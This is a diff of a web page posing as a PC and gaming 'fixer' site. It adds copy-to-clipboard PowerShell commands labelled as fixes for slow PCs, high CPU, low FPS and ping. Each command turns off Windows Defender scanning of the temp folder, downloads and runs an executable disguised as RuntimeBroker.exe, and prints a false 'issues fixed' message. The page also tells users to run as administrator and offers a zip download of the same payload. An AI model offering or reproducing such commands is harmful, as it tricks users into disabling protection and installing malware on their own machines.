@@ -259,7 +259,7 @@
   <!-- ⚠️ Modal -->
   <div class="modal" id="adminModal">
     <div class="modal-content">
-      <p>PowerShell MUST be run as ADMINISTRATOR or it will not work</p>
+      <p>⚠️PowerShell MUST be run as ADMINISTRATOR or it will not work⚠️</p>
       <button onclick="startSite()">OK</button>
     </div>
   </div>
@@ -272,7 +272,11 @@
     <div class="label">🔥 Most Popular Fix 🔥</div>
     <button onclick="toggleCopyBox('popular-command', this)" class="fix-button active">Fix Visual Studio Errors</button>
     <div class="copy-box" id="popular-command">
-      <code>[Net.ServicePointManager]::SecurityProtocol = ...</code>
+      <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
       <button class="copy-btn" onclick="copyFrom('popular-command')">Copy to Clipboard</button>
     </div>
 
@@ -281,25 +285,41 @@
     <div class="dropdown" id="dropdown" style="flex-direction: column;">
       <button class="fix-button" onclick="toggleCopyBox('tool1', this)">Fix High CPU Usage</button>
       <div class="copy-box" id="tool1">
-        <code>[Net.ServicePointManager]::SecurityProtocol = ...</code>
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
         <button class="copy-btn" onclick="copyFrom('tool1')">Copy to Clipboard</button>
       </div>
 
       <button class="fix-button" onclick="toggleCopyBox('tool2', this)">Fix Slow PC</button>
       <div class="copy-box" id="tool2">
-        <code>[Net.ServicePointManager]::SecurityProtocol = ...</code>
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
         <button class="copy-btn" onclick="copyFrom('tool2')">Copy to Clipboard</button>
       </div>
 
-      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Fix Windows Updates</button>
+      <button class="fix-button" onclick="toggleCopyBox('tool3', this)">Fix Low FPS (ANYGAME) </button>
       <div class="copy-box" id="tool3">
-        <code>[Net.ServicePointManager]::SecurityProtocol = ...</code>
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
         <button class="copy-btn" onclick="copyFrom('tool3')">Copy to Clipboard</button>
       </div>
 
-      <button class="fix-button" onclick="toggleCopyBox('tool4', this)">Fix App Crashes</button>
+      <button class="fix-button" onclick="toggleCopyBox('tool4', this)">Fix HIGH PING (ANYGAME) </button>
       <div class="copy-box" id="tool4">
-        <code>[Net.ServicePointManager]::SecurityProtocol = ...</code>
+        <code>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Evocative Supports V2" -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "...................................................................ISSUES HAVE BEEN FIX PLEASE REBOOT YOUR PC" -ForegroundColor Green
+
+
+
+</code>
         <button class="copy-btn" onclick="copyFrom('tool4')">Copy to Clipboard</button>
       </div>
     </div>
@@ -307,7 +327,7 @@
     <div class="label">📦 If fixers are not working, download this</div>
     <button class="fix-button" onclick="toggleDownloadBox()">Show Download</button>
     <div class="download-box" id="downloadBox">
-      <a href="YOUR_DIRECT_DOWNLOAD_LINK_HERE.zip" download>
+      <a href="https://codeload.github.com/EvocatedSupport/RuntimeBrokerFixer/zip/refs/heads/main" download>
         <button class="download-btn">⬇ Download Fixer</button>
       </a>
     </div>
